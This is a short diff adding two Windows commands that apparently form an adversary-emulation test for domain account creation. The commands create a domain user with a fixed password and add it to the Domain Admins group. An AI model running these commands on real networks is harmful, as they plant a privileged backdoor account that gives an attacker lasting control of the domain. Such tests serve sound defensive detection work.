@@ -1,0 +1,2 @@
+net user "T1136.002_Admin" "P@sswo!rd" /add /domain
+net group "Domain Admins" "T1136.002_Admin" /add /domain
